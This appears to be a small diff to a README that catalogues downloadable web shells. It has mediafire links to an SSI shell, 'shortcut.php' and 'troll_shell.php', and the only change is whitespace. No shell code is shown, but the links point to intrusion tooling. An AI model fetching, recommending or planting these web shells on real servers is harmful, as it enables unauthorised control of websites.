@@ -164,7 +164,7 @@ Date : 10 January 2023
 # <a href="https://www.mediafire.com/file/ksyi3i9ooz8rfmp/ssi_shell.shtml/file">SSI</a> ( SHTML )
 <img src="https://imgur.com/VjtcwsO.png" alt="beruangsalju profile">
 
-	# <a href="https://www.mediafire.com/file/3ak2plgf4k07jxn/shortcut.php/file">shor7cut </a>
+# <a href="https://www.mediafire.com/file/3ak2plgf4k07jxn/shortcut.php/file"> shor7cut </a>
 <img src="https://i.imgur.com/Ncha9AF.png" alt="beruangsalju profile">
 	
 # <a href="https://www.mediafire.com/file/viizjs2wqsu880h/troll_shell.php/file">TR0LL1N9</a> 
